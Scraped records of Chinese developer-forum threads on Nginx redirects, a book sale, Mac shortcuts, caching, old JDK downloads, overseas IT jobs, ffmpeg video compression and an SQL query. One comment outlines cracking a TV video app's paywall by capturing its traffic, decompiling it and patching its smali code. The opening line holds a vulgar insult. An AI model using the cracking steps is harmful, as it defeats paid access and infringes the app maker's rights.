"他应该是忘了吧", " 哟，儿子，又碰到你在这里喷了，你山东的老母现在正我胯下呻吟撒，叫爸爸。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Nginx 怎么配置根据 User-Agent 跳转到不通地址<br>\n比如，跳转到移动端的网站</p>\n<p>我怎么配都跳转不过去</p>\n</div></div>"], "reply": "14", "tittle": "Nginx 怎么配置根据 User-Agent 跳转到不通地址，比如，跳转到移动端的网站", "comment": ["强烈不推荐这么做，如果是用于生产环境的话\r", "Nginx 、 apache 、 tomcat 这些 server 的配置一般不是由开发来管理的，因此\r", "- 每次更新的时候都需要运维参与\r", "- 出现问题的时候回滚非常麻烦\r", "- 性能倒是其次， debug 会非常复杂\r", "\r", "一般都会在 container 跑个小程序做这个，好处有\r", "- 自己更新\r", "- 出问题了自己回滚\r", "- 容易 debug\r", "\r", "把难以监控，不透明的东西做的简单，复杂的东西做的透明，就是这样", "## rewrite spider\r", "if ($http_user_agent ~* (baiduspider|googlebot|Googlebot|soso|bing|sogou|yahoo|sohu-search|yodao|YoudaoBot|robozilla|msnbot)) {\r", "                rewrite  ^/(.*)$  ", "  permanent;\r", "                }", "   你需要这个", "直接上代码不好吗，干吗要 nginx 配置， php 扩展有手机类型，直接判断了，然走那就走那", "前端、后端做，都轮不到运维做。。。", "现在网站直接响应式了", "咋不做响应式呢", " \r", " 可能楼主觉得响应式浪费流量\r", "\r", "我们也不建议在 nginx 端做这个，后端程序判断才是最好的", "更多的可能是上面要求 1 天内做完吧.\r", "改 nginx 配置可能是最快的了.\r", "\r", "location /{\r", "    set $mob 'y';\r", "    if ($http_user_agent ~* \"(Android|iPhone|Windows Phone)\"){ set $mob \"${mob}e\"; }\r", "    if ($host != 'm.exp.com'){ set $mob \"${mob}s\"; }\r", "    if ($mob = \"yes\"){ rewrite ^/$ ", " last; }\r", "    include /mnt/clouddisk/sync/web/rewrite.conf; #rewrite end\r", "}", "不过现在也更推荐用代码控制,\r", "让用户访问 exp.com,判断后跳转到 ", " / ", " nice 支持这么多语言", "怎么楼上都是用 if 和 rewrite 的呢………\r", "用 map 和 return 不好吗？", "<script type=\"text/javascript\">\r", "    var isIosFlatform = function() {\r", "        return navigator.userAgent.match(/(iPad|iPhone)/) ? !0 : !1\r", "    };\r", "    var isAndroidFlatform = function() {\r", "        return navigator.userAgent.match(/(Android)/) ? !0 : !1\r", "    };\r", "    var isMobile = function() {\r", "        return isIosFlatform() || isAndroidFlatform() ? !0 : !1\r", "    };\r", "    if (!isMobile()) {\r", "        window.location.href = \"http://www.xxx.com/\"\r", "    }\r", "</script>", "最后不得已，使用了 lua"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>全部是购买于京东，基本全新，可能会有落灰，没有翻过。低价出售并包邮，售价很不错了，可小刀。<br>\n开始考研，等到明年这个时候，这些书可能会过时了，所以出掉回本，换一些辅导书看 =_=</p>\n<p><strong><em>给我 id 的 126 邮箱，发你的收货地址和手机号，我会给你回复邮件</em></strong></p>\n<p>书名\t售价\t京东链接</p>\n<ol>\n<li>iOS 开发指南 从 Hello World 到 App Store 上架 第 4 版\t55\t<a href=\"https://item.jd.com/11976900.html\" rel=\"nofollow\">https://item.jd.com/11976900.html</a></li>\n<li>从零开始学 Swift\t45\t<a href=\"https://item.jd.com/11896403.html\" rel=\"nofollow\">https://item.jd.com/11896403.html</a></li>\n<li>CSS 权威指南（第 3 版）\t35\t<a href=\"https://item.jd.com/10100250.html\" rel=\"nofollow\">https://item.jd.com/10100250.html</a></li>\n<li>JavaScript 权威指南（第 6 版）\t65\t<a href=\"https://item.jd.com/10974436.html\" rel=\"nofollow\">https://item.jd.com/10974436.html</a></li>\n<li>重构 改善既有代码的设计\t35\t<a href=\"https://item.jd.com/11728740.html\" rel=\"nofollow\">https://item.jd.com/11728740.html</a></li>\n<li>第一本 Docker 书 修订版(翻过)\t30\t<a href=\"https://item.jd.com/11909234.html\" rel=\"nofollow\">https://item.jd.com/11909234.html</a></li>\n<li>深入理解 JavaScript\t45\t<a href=\"https://item.jd.com/11846759.html\" rel=\"nofollow\">https://item.jd.com/11846759.html</a></li>\n<li>JavaScript 函数式编程\t30\t<a href=\"https://item.jd.com/11736483.html\" rel=\"nofollow\">https://item.jd.com/11736483.html</a></li>\n<li>算法 第 4 版 Algorithms Fourth Edition\t45\t<a href=\"https://item.jd.com/11098789.html\" rel=\"nofollow\">https://item.jd.com/11098789.html</a></li>\n<li>CSS 揭秘\t45\t<a href=\"https://item.jd.com/11911279.html\" rel=\"nofollow\">https://item.jd.com/11911279.html</a></li>\n<li>鸟哥的 Linux 私房菜：服务器架设篇（第三版）\t45\t<a href=\"https://item.jd.com/11018248.html\" rel=\"nofollow\">https://item.jd.com/11018248.html</a></li>\n<li>鸟哥的 Linux 私房菜 （基础学习篇 第三版）\t40\t<a href=\"https://item.jd.com/10064429.html\" rel=\"nofollow\">https://item.jd.com/10064429.html</a></li>\n</ol>\n<p><img alt=\"\" src=\"https://ww2.sinaimg.cn/large/0060lm7Tgy1fec5bbhu01j30ze0mkwjw.jpg\"></p>\n</div></div>", "<div class=\"topic_content\">6 docker\r<br>9 算法 已出</div>", "<div class=\"topic_content\">3 css 权威\r<br>4 js 权威\r<br>10 css 揭秘\r<br>已出</div>", "<div class=\"topic_content\">1 iOS\r<br>2 Swift 已出</div>", "<div class=\"topic_content\">7. 深入理解 JavaScript\r<br>\r<br>已出</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><ol>\n<li>重构 改善既有代码的设计  已出</li>\n</ol>\n<p>还有 <strong>待售</strong><br>\n8. JavaScript 函数式编程<br>\n11. 鸟哥的 Linux 私房菜：服务器架设篇（第三版）<br>\n12. 鸟哥的 Linux 私房菜 （基础学习篇 第三版）</p>\n</div></div>", "<div class=\"topic_content\">8 js 函数式编程 已出</div>", "<div class=\"topic_content\">11 和 12  鸟哥 已经卖掉。\r<br>\r<br>非常感谢 V 友的支持，书已经全部卖掉。</div>"], "reply": "16", "tittle": "出售一些全新书： JS/ iOS/ CSS/ docker/ Linux / 算法", "comment": ["6 和 9 一起买，可否便宜些。", " 可以便宜，地址哪里，这个很重要啊 =_=", " 宁波的", " 发你邮箱了", " 给我发邮件， 70? 算法那本全新的， docker 仅翻过的。。。", "3 ， 4 ， 10 一起 南京", "你们是从 0 基数，还是 1", " 不是标着号吗", "v2 有二手交易节点，注意下。\r", "\r", "如果有设计模式的书我倒想要一本，手头有不过是一本 Java 的，我想要 js 的", " 7 和 8 的 js 考虑一下呗。", " 看了下深入了解 js 挺不错的，已发邮件", "重构 已发邮件", "8 已发邮件", "11 已发", "12. 鸟哥的 Linux 私房菜  预定", " 我也在宁波~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>切换程序大多三种方式</h3>\n<blockquote>\n<p>鼠标: 不优雅</p>\n</blockquote>\n<blockquote>\n<p>cmd+tab: 相邻程序还好, 但是如果是 5 个程序切换, 效率就差很多了</p>\n</blockquote>\n<blockquote>\n<p>快速启动工具: 三步, 打开工具, 输入关键字, 回车, 中间可能还隐藏了一个上下切换到正确程序的步骤</p>\n</blockquote>\n<blockquote>\n<p><strong>解决方案</strong>: 使用 snap, 为每个常用 app 设置快捷键(其实很简单的), 下文详细介绍技巧+理念</p>\n</blockquote>\n<h3>切换窗口(同一个程序的多个窗口)</h3>\n<blockquote>\n<p>mission control 后选择: 两步, 如果窗口太多, 找也挺麻烦的</p>\n</blockquote>\n<blockquote>\n<p><strong>解决方案</strong>: mac 默认的快捷键 cmd + 小撇号(1 左边的按键), 使用的时候不建议过多的窗口, 使用多页签代替</p>\n</blockquote>\n<h3>切换页签(类似 chrome 的多个页签, 很多程序都支持)</h3>\n<blockquote>\n<p>ctrl+[shift]+ tab: 逻辑不完全相符, 有的是向右或左, 有的是回到上一个打开的页签</p>\n</blockquote>\n<blockquote>\n<p>不同程序中各自的快捷键: 不同程序默认的快捷键不一定相同, 记忆成本较高</p>\n</blockquote>\n<blockquote>\n<p><strong>解决方案</strong>: cmd+shift+中括号(p 右边的两个), 左括号向左, 右括号向右. 这是黑科技, 大多数程序没明确说支持这套快捷键, 但是, 就是可以使用. 目前只发现一个例外: chrome 在自带拼音输入法的中文模式下, 实效, 解决办法是 设置=&gt;键盘=&gt;快捷键=&gt;应用快捷键, 重新为 chrome 设置'选择下一个标签'的快捷键即可</p>\n</blockquote>\n<h3>切换窗格(一个页面中的多个部分)</h3>\n<blockquote>\n<p>说实话, 用的很少, 主要使用窗口+页签完成</p>\n</blockquote>\n<blockquote>\n<p>如果真的分窗格, 也是使用 sizeup 来进行窗口的左右(或者四角)分屏, 然后进行窗口的切换</p>\n</blockquote>\n<h3>详细说明 snap</h3>\n<blockquote>\n<p>snap 是为每个 app 设置全局快捷键, 默认对应的是 dock 的前 9 个 app(finder 之后开始), 然后也能手动增加指定 app 的快捷键.</p>\n</blockquote>\n<blockquote>\n<p>建议使用 option 作为所有 app 的呼出修饰键, 理由是 1.简单, 2.相对冲突并不是很大</p>\n</blockquote>\n<blockquote>\n<p>有很多人说 option 会有对应的快捷键, 有冲突, 但是使用一年下来, 发现单独用 option 做快捷键的, 真的用的很少很少, 大多都是配上其他修饰键(cmd, ctrl, shift 等), 直接使用 option, 搭配字母, 是输入特殊符号的, 所以并没有被程序进行大量占用, 而那些符号, 额, 两年没有用过 1 次.</p>\n</blockquote>\n<blockquote>\n<p>如果担心背不下来那么多, 其实也很简单, 先记少量且简单的, 比如 dock 的前四个位置, 放上最常用的 4 个即可(浏览器, qq, 编辑器, 数据库), 然后其他 app 使用字母来记忆, 比如 邮件: option+M(mail), 笔记: option+N(note), excel: option+E(excel), Dash 就是 option+D(Dash)等等</p>\n</blockquote>\n<blockquote>\n<p>在有一定的熟悉程度之后, 再去增加其他的程序快捷键, 比如 迅雷 option+T(Thunder), 网易云音乐: option+9(9 的话两只手很方便)</p>\n</blockquote>\n<blockquote>\n<p>熟练之后, 常用的 15 个程序, 只用 2 个键即可完成</p>\n</blockquote>\n</div></div>"], "reply": "3", "tittle": "Mac 下切换程序, 切换窗口, 切换页签的通用解决方案", "comment": ["我用 manico ，自认为比 snap 要好", "又来", " 我以为是作者来做推广了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>一般流程肯定是从数据库读取相关信息并显示，但随着流量的逐渐增多，这种方式似乎让服务器吃不消。\n当前网站业务主要为展示形式，文章的修改不频繁。目前想到的方案是，把文章生成 json 文件，保存在磁盘里，程序去寻找路径去读取对应的 json 文件。不知道这样子是否可以减轻到服务器的压力呢？</p>\n</div></div>"], "reply": "7", "tittle": "高流量资讯网站，读数据该用何方法最高效呢？", "comment": ["你这直接进行文件 IO ，比数据库还慢呢，虽然数据库读写也基本是文件 IO ，但好歹有算法做优化，并且有一部分是在内存中操作的，肯定比直接文件 IO 要快。 IO 速度： CPU cache>Memory>DB>FS,为毛不直接用 Redis 或者 Memcached 呢？", "整个页面缓存全走 cdn 资讯网站动态部分除了广告能有多少 剩下的就看你有多少钱了", "上 CDN ，上缓存", "既然是静态文件的话， cdn > 内存缓存 > redis/memcached > db > 文件 。\r", "看你自己业务，服务器， 资金等方面的考虑了。\r", "不过，应该是不会选择你说的这个方案的，原因就是 @", " 说的。", "直接生成静态 html ，传统 cms 就是这样搞", " 同楼上，直接的静态 html 不解释，再加个 CDN ，喜刷刷", "内容更新不频繁就静态化或者伪静态化以后上 cdn 呀"]},
{"content": ["<div class=\"topic_content\">如题，有时候由于某种需要不能使用最新版本的 jdk ，大神有没有啥窍门下载低版本的 JDK</div>", "<div class=\"topic_content\">现在又有新需求：如何在 linux 的 shell 中实现下载旧版本的 jdk 安装包，确实是有一些需求，我也不想啊，我看网上的是：\r<br>wget --no-cookie --header \"Cookie: oraclelicense=accept-securebackup-cookie\" <a target=\"_blank\" href=\"http://download.oracle.com/otn-pub/java/jdk/8u102-b14/jdk-8u102-linux-x64.rpm\" rel=\"nofollow\">http://download.oracle.com/otn-pub/java/jdk/8u102-b14/jdk-8u102-linux-x64.rpm</a> -O jdk-8u102-linux-x64.rpm\r<br>这种，但是如果是下载旧版本的比如说 jdk 7 就不行\r<br>wget --no-cookie --header \"Cookie: oraclelicense=accept-securebackup-cookie\" <a target=\"_blank\" href=\"http://download.oracle.com/otn/java/jdk/7u80-b15/jdk-7u80-linux-x64.tar.gz\" rel=\"nofollow\">http://download.oracle.com/otn/java/jdk/7u80-b15/jdk-7u80-linux-x64.tar.gz</a> -o jdk-7u80-linux-x64.tar.gz\r<br>\r<br>再次请教大神~~~</div>"], "reply": "15", "tittle": "如何下载旧版本 JDK？", "comment": ["jdk 是向下兼容的", "直接去官网下载去不就得了，我记得上一年我还下了 jdk6 ，", " 人家都说了有特殊需要", " ，感谢", "去官网找连接，然后复制连接，用 迅雷 旋风 云盘之类的东东下， 他们有自己的缓存可以直接下。", "  @", "  @", "  @", "  @", " #8 什么意思？艾特我们又不说话，打扰我们般砖啊", " 我说了，用一些有服务器缓存的下载软件下，比如 Windows 上我说的那些，然后在传给 linux 。\r", "\r", "你补充的那个仅仅是通过命令行下载官网 jdk 的方式，因为网页上会要求你选择同意相关协议，而且这个同意的状态是写入 cookie 的，所以你可以直接加 cookie 然后访问下载链接。\r", "但是 这个方式 和你去网页点击下载没有不同！！！\r", "\r", "而 oracle 限制只有最新版的 jdk 可以直接下载，其他版本的需要登录，所以你访问那个下载链接就直接跳转到登录页了。", "你这需求本身就是错误的， JDK 的最新版，对之前的版本都是兼容的，为何要老版本？", "首先 不懂为什么需要下载老版本的 jdk\r", "jdk 的向前兼容做得还是很不错的\r", "\r", "\r", "另外 如果你真的需要的话：\r", "\r", "\r", "这是我自己之前记录的东西 应该会有一些帮助吧", "下载了再传到服务器上面吧", "我以前也一直以为运行的话是兼容的，然而我今天发现并不完全。\r", "jdk7 编译的代码，用 jdk8 启动 tomcat7 。\r", "结果 spring3.2.9 的 jar 启动时就报错了\r", "NoClassDefFoundError:Could not initialize class org.springframework.beans.factory.BeanCreationException"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>工作机会或薪资待遇方面，有没有什么方式或社交平台？因为国内公司宗旨一直都想办法怎么“压榨”，对国内环境失望，最近想比较一下欧美的工作环境（正规的，不是刷盘子洗碗打小工的那种，主要指 IT 方面），也好看看人家视野做事方式、比较一下我们差或好的地方等等，说不定哪天我们就有大把机会去祸害他们了呢→_→。\n刚在 we work remotely 上看那些待遇和条件，比我们档次高出不止一点点……</p>\n</div></div>", "<div class=\"topic_content\">或者他们有没有像我们 V2EX 的社区？</div>", "<div class=\"topic_content\">听说过一个米国高端 IT 社区 app 叫 Blind ，条件高到国内的阿里腾讯都进不去……</div>"], "reply": "22", "tittle": "大家怎么了解欧美 IT 环境的？", "comment": ["一亩三分地\r", "MITBBS", "关注，想了解欧洲的 IT 氛围", " 这是留学生用的社区吧", "reddit 应该有专门的板块", "在哪不是压榨...", "如果是想对于某个公司求职有个一般性的了解，可以在 glassdoor 上搜索公司，底下一般都会有面试经验和在职员工对于公司方面的评价。如果更 general 一点我感觉多上上一亩三分地和 mitbbs 吧，一亩三分地报面经的比较多， mitbbs 上老中索南比较多 lol 。著名血汗工厂应该就是 A 家了吧 :)", "Actually working there. \r", "\r", "在一家小垂直搜索引擎干活，这几个东西做得很好\r", "- 日志的集中处理，分析，并且有自己的一套系统可以让所有人看， PM 也可以看一些 AB 测试导致的 metrics 变化\r", "- 大量的自动化工具以及监控系统，覆盖业务、工程数据监控\r", "- 工程师救火之后会写总结，并且要求开发工具来减少人工失误\r", "- 任何请求必须开 JIRA 来跟踪\r", "总之就是： 1 、增加系统的 visibility ，任何的变动都会在某个指标上反映出来。 2 、尽量减少人的干预\r", "食堂方面\r", "- 免费饭菜\r", "- 免费饮料：可乐、红牛、 Monster 、各种茶等\r", "基本上和湾区差不多。不过我们在德州。", " 老哥 稳", "glassdoor?", "据来这边工作的美国同事说，欧洲和美国 it 工作环境差别也蛮大的", " 那是欧洲好还是北美好？", "瞎猜一个：上面那位是在 Indeed 。", " 美国同事说欧洲要好些，假期多一点", "资本主义的核心就是压榨啊...\r", "我 hr 刚把我搬家费取消了 很气... 决定明天打过去骂人...", "美国初创公司应该比国内的更累，国内公司用上“压榨”这个词，那最好别找美国的。\r", "\r", "只是我觉得他们在新技术接受方面好得多，新项目没什么技术债务，只是好的技术，架构方面想法都可以提上日程讨论和使用。已经参与做过几个欧美初创项目，还包含一个支付平台，我远程工作（只接项目）。", " 日志基本都会用到， ELK ， 或者基于云的方案， Loggly ， LogEntries 等。\r", "\r", "自动化嘛，国内有几个公司要求写测试？？？\r", "\r", "之前一个项目，都要求写单元测试，集成测试，然后 CircleCI ，运行分支测试。用 Github/Zenhub 管理项目 Issue ，交叉 Code Review ，所有修改都测试通过，合并到 Master 。一定量 Features 完成，打 Tag ， Tag 自动通过 CI 部署到 QA(没太大的问题，就基本上应用到准生产环境）。", "blind 负面消息看多了要死", " Loggly, LogEntries 比较局限，没有 joining log 功能\r", "\r", "我们有的时候会需要看一个用户在不同子系统之间的情况， log join 的功能会很有用（虽然也很慢）", "正好也在德州，基本情况差不多， tooling 方面应该是优势，流程和自动化都比较完善了", "一亩三分地的找工板", "欧洲这边的一般是什么啊？", "我也在德州= =！\r", "1. 工作流程规范，用 Git Workflow ，代码审核也十分严格。基本上，每天上午的时间就是做 code review 的\r", "2. 分工足够细致。有不同的 team 负责后端、 API 、 UI 框架和设计。我们只负责前端的开发和测试\r", "3. 和楼上有人提到的一样，我们也用 JIRA 。会有人专门负责把目前的商业需求转成 ticket ，然后我们接 ticket 干活\r", "4. 公司本身追求的是高质量代码，而不是完成任务\r", "5. 需要的测试很多。我做前端，需要写 Unit test 和 Mock test 。写测试与开发功能的时间基本上 3:1 甚至 4:1 。对于专职的 QE ，他们还要负责 Smoke Test ， Integration Test ，和 Regression Test ，以及环境的维护\r", "6. 在工作不故意拖沓的前提下， Leader 更在意的是你工作开不开心，最合适的节奏是有一点挑战，但可以解决。太难或者太简单都不好\r", "7. 任务都是可以，也应该在规定时间内完成的，不需要加班。当然如果你改一个按钮颜色改了一天，那自己不加班都有点儿说不过去\r", "8. 环境肯定没的说，硬件设施也没的说。只是我们没有免费的午餐=。=\r", "\r", "至于楼主的问题，你可以去 hackernews 看看，这是专门给程序员的。 reddit 更像是逗闷子的地方，真正的技术问题早就去 stackoverflow 了。或者，去 twitter 看看也不错， twitter 上面分享的可能更接近生活，少一些技术。\r", "\r", "如果你想了解薪资之类的事情，可以去 glassdoor 看看。薪资，取决于很多因素：公司、职位、级别、地区\r", "\r", "如果你想了解，大公司都在用什么技术，可以去 stackshare.io 看看。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>2 号下午,老婆拿着一台手机跑过来跟我说,\"为什么这个视频发不了微信? \"\n在她演示给我看的时候,我知道了可能的原因.微信提示\"导入失败\", 但是实际原因是可能视频过大. 找到要发送的文件一看大小,居然有: 2.48G, 虽然只有 19 分钟左右的长度.\n然后我就有了把这个视频发送到微信群上的任务. 不过还好不是修电脑,我想我应该可以搞定.</p>\n<ol>\n<li>\n<p>先把视频传输到电脑上\n开始尝试使用蓝牙来传,但是半天没有响应. 然后还是打开开发者模式(用完之后记得关闭) 使用 adb 来传.\n<code>adb pull /storage/emulated/0/DCIM/Camera/20170402_151526.mp4</code> (其实 adb pull 也不怎么快)</p>\n</li>\n<li>\n<p>初尝 ffmpeg 压缩\n用手机拍的原始视频,由于没有压缩过体积都很大. 首先我想到用 ffmpeg 来压缩一下.\n<code>ffmpeg -i 20170402_151526.mp4 -vcodec libx264 -preset slower -crf 28 -acodec libmp3lame -ab 128k 15151.mp4</code>\n执行这条命令大概过了一个小时压缩完成,压缩到了 500 多 M,我看了下效果,肉眼看起来没什么差别. 但是还是太大了.然后想着,换用其他参数再试,感觉太慢了, 我想直接在 15151.mp4 这个结果之上再压缩. 首先原来的分辩率是 1920 x1080 发微信用不了这么大,发 480p 的就差不多了. 但是试了几个参数都差强人意.</p>\n</li>\n<li>\n<p>换用 QuickTime Player 导出有惊喜\n这个时候我想起,好像 QuickTime Player 好像也支持将视频导出成小格式. 于是试了下,\n选择导出成 480p, 令我很意外的是,从原来的 2.48 G 的视频导出成 480p 的视频,只花了 1 分钟左右的时间 , 最后导出的大小是 大概 500 多 M mov 格式视频.,比 ffmpeg 快多了.</p>\n</li>\n<li>\n<p>使用 ffmpeg 再压缩\n然后再将 QuickTime Player 导出的 mov 格式的视频用 ffmpeg 再压缩一下.\n<code>ffmpeg -i 20170402_151526.mov -vcodec libx264 -preset slow 15153.mp4</code>\n这个压缩之后只有 100 M 左右了. 查了下微信的限制大概是 25M. 但是再压的话也压不到 25M 以下,毕竟有 19 分钟的长度. 然后我想着把这个视频分 5 段输出.</p>\n</li>\n<li>\n<p>视频旋转\n分段之前先将原来横屏的视频,翻转 90 度. <code>ffmpeg -i 15153.mp4 -vf rotate=PI/2 15153_r.mp4</code></p>\n</li>\n<li>\n<p>使用 ffmpeg 分段.\n<code>for ((i=0;i&lt;5;i++)); do ffmpeg -ss $((i * 230)) -i 15153_r2.mp4 -c copy -t 230 vp$i.mp4; done;</code>\n我这里使用了一个 for 循环,其实也可以不用循环,多执行几次就 OK 了.\n比如第一段: <code>-ss 0</code> 参数后面表示偏移时间为 0(秒),  <code>-t 230</code> 表示时长 230 秒.\n<code>ffmpeg -ss 0 -i 15153_r2.mp4 -c copy -t 230 vp1.mp4</code></p>\n</li>\n<li>\n<p>将各分段视频推送到手机上\n<code>adb push vp{0,1,2,3,4}.mp4 /sdcard/</code></p>\n</li>\n</ol>\n<p>推送到手机上是因为没有 WiFi, 需要使用手机流量来发送.(还好我流量够用)</p>\n</div></div>"], "reply": "31", "tittle": "记一件好事: \"帮我把这个视频发到微信群里\"", "comment": ["为什么要用 adb 来拉文件。。。 MTP 不好么", "USB 插到电脑上看不到存储盘吗？", "我上次也遇到类似的问题，结果我发了个在线视频地址过去就完事了。。。\r", "2333333333333\r", "如果是本地视频，可以上传到第三方视频平台吧。", "为什么不传到腾讯视频再分享？", "微信视频的时长最长是多少。。", " #1\r", "1. OS X 并不支持 MTP ，虽然可以装 Google 官方的 ", " 应用来传输 MTP\r", "2. MTP (对我而言)很不稳定（——看个人使用情况，不用讨论）", "其实，能不能 ffmpeg 再 quicktime 再 ffmpeg 再 q 再 f …重复执行", "安卓手机的话可以弄个 ES 文件管理器，用 FTP 方式管理文件", "那天下午，老婆跟几个闺蜜在家看综艺节目，突然跑过来跟我说，“ xxtv 这个要会员才能看呢”，我一看是有预览时间的，应该可以搞定\r", "1.直接 adb connect 192.168.2.105:5555 连上电视\r", "2.接着 adb shell tcpdump -p -vv -s 0 -w /sdcard/video.pcap 进行抓包，切换一下视频清晰度之后中断\r", "3.然后 adb pull /sdcard/video.pcap ，用 wireshark 打开过滤 http 协议竟然直接找到几个 m3u8 地址\r", "4.打开一个原来的 DLNA 测试工程，代码中写死播放地址，然后运行选择电视直接 push 过去让她们先看着，但是这样每个视频搞一次不是累死？\r", "5.趁她们看电视的时候直接从系统找到那个 apk ，发现除了混淆外没做什么安全防护，反编译之， java 和 smali 各一份\r", "6.在 java 代码中分析播放器模块播放进度逻辑部分，很快找到一个 progress 的回调跳转判定\r", "7.再到 smali 文件定位这个地方，修改跳转逻辑重新打包安装测试没发现问题，速替换掉电视上的包，真是神不知鬼不觉，但是 who care?\r", "速速回到书房发现世界之树已经被拆了，竟然扣了 14 分！！！冲了一个月的分啊", "上传到优酷 发视频链接最简单", " \r", " \r", " \r", "考虑到是一个比较私密的视频,不方便放到这些视频网站.", " 这个才是最强的……", "我可能做的是假 Android 开发", "你这个参数当然慢了\r", "ffmpeg -i 20170402_151526.mp4 -vcodec libx264 -preset slower -crf 28 -acodec libmp3lame -ab 128k 15151.mp4\r", "faster 以下压缩效果都差不太多，时间就要爆炸了\r", "而且你这里也没降分辨率啊， 480p 没多少的\r", "crf28 也有点过了，默认 23 ，其实 20 都能看的\r", "音频不要 mp3 ， aac 才是标准", "adb pull 虽然慢，但是稳定啊", "压片不用 Handbrake ？", " crf 是数字越小画质越好。。", " 是我记错了……\r", "我就是记得比默认设置更差的 crf 其实编码出来也不是不能看而已", "这是顺手破解了 xxtv 的会员啊。。。", "一个格式工厂就能搞定的事。。。", " 谁说的 who care ？\r", "这都能找到老婆，我才是日了狗\r", "(╯‵□′)╯︵┻━┻", " 666", " 难道不应该是赶紧给老婆充上会员吗？你这脑回路清奇啊。", " 我选择开个会员……", "9L 信仰不纯阿", " 如果老婆大人让你破解一下小米视频的会员呢？", "原来我的关注点  \r", "差强人意的意思是勉强使人满意  \r", "为什么总有人乱用，不是高考重点词汇吗", " #28 原谅", "额，是不是可以开个 gif 录制下视频，然后发上去\r", "\r", "虽然时间长点。。", "大哥 安卓 xposed + 微信视频转发插件！不好用吗？", " 默认 23 ，其实 28 已经接近不能看了，高频噪点满天飞，低频各种大色块。"]},
{"content": ["<div class=\"topic_content\">### 以下数据结构，你如何查询某一日期或之前，学生在某年级的单科最新成绩分数，按学生姓名进行排正序取 10 条，请写 SQL 。在特定日期、每个学生在同一年级、同一学科只返回一条成绩数据。查询时，如果特定日期没有成绩数据，则需要返回这个日期之前的最新（离特定日期最近）成绩数据。\r<br>\r<br>\r<br>| 科目   | 年级   | 学生   | 成绩日期       | 成绩分数 |\r<br>| ---- | ---- | ---- | ---------- | ---- |\r<br>| 语文   | 1    | 张三   | 2015-01-03 | 100  |\r<br>| 语文   | 1    | 李四   | 2015-01-03 | 80   |\r<br>| 语文   | 1    | 张三   | 2015-01-05 | 80   |\r<br>| 语文   | 1    | 李四   | 2015-01-05 | 90   |\r<br>| 数学   | 1    | 张三   | 2015-01-04 | 80   |\r<br>\r<br>提醒：如果要取 2015-01-05 的数据，要求得到张三的语文 1 年级成绩为 80 分，李四的语文 1 年级成绩为 90 分，张三的数学成绩为 80 分。要考虑到在同一天、同一学科、同一年级不是所有学生都有成绩。执行 SQL 查询需要得到的结果如下：\r<br>\r<br>\r<br>| 科目   | 年级   | 学生   | 成绩日期       | 成绩分数 |\r<br>| ---- | ---- | ---- | ---------- | ---- |\r<br>| 语文   | 1    | 李四   | 2015-01-05 | 90   |\r<br>| 数学   | 1    | 张三   | 2015-01-05 | 80   |\r<br>\r<br>\r<br>我的思路是:case when + group by\r<br>\r<br>求解~</div>"], "reply": "21", "tittle": "请教一条 sql 的写法", "comment": ["描述的有点绕 就是求  科目 | 年级 | 学生 的最新日期下面的分数呗 select 1 2 3 max(4) 5 from list 不是就好了么", "试试逻辑判断部分用代码去做\r", "没必要用一条 sql 就搞定所有", " 显示不是的.日期是变量.", "另外按照描述\r", "| 语文 | 1 | 张三 | 2015-01-05 | 80 | \r", "这条数据应该也是在结果页的 张三的语文成绩也是复合需求的", " 日期用其它前端语言传参啊 如果是要在某个日期之前 就加个 where 如果没有参数 就传当前日期", "SELECT * FROM t1 NATURAL JOIN (SELECT `学生`, `科目`, `年级`, MAX(`成绩日期`) AS `成绩日期` FROM t1 WHERE `成绩日期` < \"2015-01-05\" GROUP BY  `学生`, `科目`, `年级` ORDER BY  `学生` LIMIT 10)\r", "\r", "大概这样？如果不能 JOIN 换成 WHERE IN 试试", " 他的 limit 10 估计是单姓名 就是取 10 个人不同科目的最新成绩 一个方案是 1 2 笛卡尔积 乘以 10 作为 limit 后面的值 还可以把姓名排序后的结果前 10 做为一个子查询去 left join 这个更新维护比较容易理解", "先说数据库。不同的数据库支持的 SQL 都不一样。", "如果是 Oracle 的话用分析函数秒解。\r", "\r", "select distinct 科目，年级，学生，'2015-01-05' as 成绩日期, first_value(成绩分数)over(partition by 科目，年级，学生 order by 成绩日期 desc) as 成绩分数\r", "   from 表\r", " where 成绩日期 <= '2015-01-05'\r", "order by 学生\r", "\r", "然后外面套一层取个 10 条。\r", "\r", "当然你给的示例是错的。张三的语文成绩呢？", " @", " @", " \r", "\"如果特定日期没有成绩数据，则需要返回这个日期之前的最新（离特定日期最近）成绩数据\"", "和下面这道题几乎一样，用 MySQL 似乎没有好的解法\r", "\r", "\r", "\r", "在正经的关系型数据库上用 Window function 或者 LATERAL JOIN 都可以搞定，比如上面 ivvei 的解法。", " \r", "\r", " 就是能实现的。", "Window function 没有的话 group_concat", "题我没太看明白（ 10 条哪里，如果是针对个人的最新 10 条成绩，就再加一层嵌套。），\r", "以下只包含了取特定日期最新成绩的功能。\r", "用基本的 exists 就能实现吧。\r", "\r", "SELECT a.* \r", "FROM 成绩表 a\r", "where exists (select a.科目 \r", "              from (SELECT \r", "                        科目,年级,学生,MAX(成绩日期) 成绩日期\r", "                    FROM 成绩表\r", "                    WHERE  成绩日期 <= '2015-01-05' \r", "                    GROUP BY 科目,年级,学生) b\r", "              WHERE a.科目 = b.科目\r", "                and a.年级 = b.年级\r", "                and a.学生 = b.学生\r", "                and a.成绩日期 = b.成绩日期);", "select * from table \r", "where (科目,年级,学生,成绩日期) =\r", "  (select 科目,年级,学生,max(成绩日期) from table \r", "     where 成绩日期 <= 查询的日期 group by 科目,年级,学生);\r", "--oracle 语法", " in", "查询时，如果特定日期没有成绩数据，则需要返回这个日期之前的最新（离特定日期最近）成绩数据。 \r", "\r", "要考虑到在同一天、同一学科、同一年级不是所有学生都有成绩\r", "\r", "这两条是不是有矛盾，按照第一条要求，就是要显示所有学科，所有学生的成绩\r", "第二条的意思有好像是说没有就不显示？", "select * from \r", "(select * from `成绩` where `成绩日期` <= '2015-01-05' order by `成绩日期` desc) \r", "as a GROUP BY 学生,科目,年级\r", "ORDER BY `学生` limit 10\r", "\r", "| 科目 | 年级 | 学生 | 成绩日期 | 成绩分数 | \r", "| ---- | ---- | ---- | 